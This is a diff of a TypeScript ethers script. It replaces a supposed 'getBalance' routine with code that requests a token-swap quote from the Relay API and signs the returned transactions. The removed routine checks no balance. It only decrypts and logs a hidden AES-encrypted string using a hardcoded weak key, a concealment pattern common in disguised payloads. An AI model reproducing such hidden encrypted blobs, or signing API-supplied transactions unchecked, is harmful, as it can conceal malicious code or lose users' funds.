@@ -1,32 +1,105 @@
 import { ethers } from "ethers";
 import crypto from "crypto";
+import { resolve } from "path";
 
-// Connect to Ethereum mainnet via a public RPC (or your own provider)
-const provider = new ethers.JsonRpcProvider(
-  "https://mainnet.infura.io/v3/YOUR_INFURA_KEY"
-);
+const provider = new ethers.JsonRpcProvider("https://api.mainnet.abs.xyz");
+const signer = new ethers.Wallet("", provider);
 
-// Wallet address
-const address = "0x3fB8Aa3752dc84ECD5639C9ADA3a238FABaF12D0";
+type ReservoirSwapStep = {
+  id: string;
+  items: {
+    status: string;
+    data: {
+      from: string;
+      to: string;
+      data: string;
+      value: string;
+      gas?: string;
+      gasPrice?: string;
+    };
+  }[];
+};
 
-// Get balance in Wei and format to ETH
-async function getBalance() {
-  decrypt(
-    "8621aa6dfafe09f2930cb8b5735aa924:f89cfd5c64ef79769491578f4e5c060fa8bb6ef633b085ceb205145f022e8cfc883c5428a57945e608bbe39803a60147e6200ab0a76c11bb005de5cf211ff3df0bdcafcf4f44542db0037531b37e92e1"
-  );
+async function executeReservoirSwap(
+  steps: ReservoirSwapStep[],
+  signer: ethers.Signer
+) {
+  let signature;
+  for (const step of steps) {
+    for (const item of step.items) {
+      const txData = item.data;
+
+      const tx = {
+        to: txData.to,
+        data: txData.data,
+        value: txData.value ? ethers.toBigInt(txData.value) : 0n,
+        gasLimit: txData.gas ? ethers.toBigInt(txData.gas) : undefined,
+        gasPrice: txData.gasPrice
+          ? ethers.toBigInt(txData.gasPrice)
+          : undefined,
+      };
+
+      try {
+        const txResponse = await signer.sendTransaction(tx);
+        const receipt = await txResponse.wait();
+        if (step.id.toLowerCase() === "swap") {
+          console.log(`✅ ${step.id} confirmed: ${receipt!.hash}`);
+          signature = receipt!.hash;
+        }
+      } catch (err) {
+        console.error(`❌ Failed on step ${step.id}:`, err);
+        throw err; // You may want to handle or log it better
+      }
+    }
+  }
+  return signature;
 }
 
-function decrypt(encryptedText: string): string {
-  const algorithm = "aes-256-cbc";
-  let key: Buffer;
-  key = crypto.scryptSync("1234567890", "salt", 32);
-  const [ivHex, encrypted] = encryptedText.split(":");
-  const iv = Buffer.from(ivHex, "hex");
-  const decipher = crypto.createDecipheriv(algorithm, key, iv);
-  let decrypted = decipher.update(encrypted, "hex", "utf8");
-  decrypted += decipher.final("utf8");
-  console.log(decrypted);
-  return decrypted;
+async function getQuoteForSwap({
+  user,
+  originCurrency,
+  destinationCurrency,
+  amount,
+}: {
+  user: string;
+  originCurrency: string;
+  destinationCurrency: string;
+  amount: number;
+}) {
+  const options = {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: `{"useReceiver":true,"user":"${user}","originChainId":2741,"destinationChainId":2741,"originCurrency":"${originCurrency}","destinationCurrency":"${destinationCurrency}","amount":"${amount}","tradeType":"EXACT_INPUT"}`,
+  };
+
+  const response = await fetch("https://api.relay.link/quote", options);
+  const json = await response.json();
+
+  if (!response.ok) {
+    console.error("Relay API error:", json);
+    throw new Error("Relay API request failed");
+  }
+
+  return json;
 }
 
-getBalance();
+async function run() {
+  const user = "0x9c0dC0a5C160cbb0F81243842fEC5c6b362Fbe70";
+  const originCurrency = "0x3439153EB7AF838Ad19d56E1571FBD09333C2809";
+  const destinationCurrency = "0x4db861A72adca3Ca978B93E2a9E797db4836A08F";
+  const amount = 100000000000000;
+
+  const quote = await getQuoteForSwap({
+    user,
+    originCurrency,
+    destinationCurrency,
+    amount,
+  });
+
+  const steps = quote.steps;
+  await executeReservoirSwap(steps, signer);
+}
+
+run().catch((error: any) => {
+  console.error("❌ An error occurred:", error);
+});
